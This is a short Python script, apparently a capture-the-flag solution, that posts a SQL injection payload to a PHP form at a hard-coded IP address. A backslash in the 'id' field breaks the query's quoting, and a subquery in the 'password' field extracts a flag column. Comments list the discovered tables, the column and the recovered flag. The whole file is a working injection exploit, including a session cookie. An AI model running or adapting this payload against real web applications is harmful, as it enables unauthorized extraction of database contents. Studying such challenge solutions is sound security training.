import urllib.parse, urllib.request


def main():
	url = 'http://108.61.161.168/GET_FLAG/input.php'
	params = {
		'id': "\\",
		'password': ",1,(select group_concat(fl4g_f1ag) from F14g_f1ag_flag),NOW())#",
		'comment': "3",
	}
	headers = {
		'User-Agent':'Mozilla/5.0',
		'Content-Type':'application/x-www-form-urlencoded',
		'Cookie':'PHPSESSID=0hfvalp9i91vbtmnlbi30s8695'
	}

	req = urllib.request.Request(url, urllib.parse.urlencode(params).encode(), headers)
	res = urllib.request.urlopen(req).read().decode("utf-8", "ignore")

	print(res)


if __name__ == '__main__':
	main()


# tables : F14g_f1ag_flag,comment,commet
# columns : fl4g_f1ag
# TRUST{Sq1i_1njecti0n_w1th_un1on_subqu3ry_GET_FLAG!}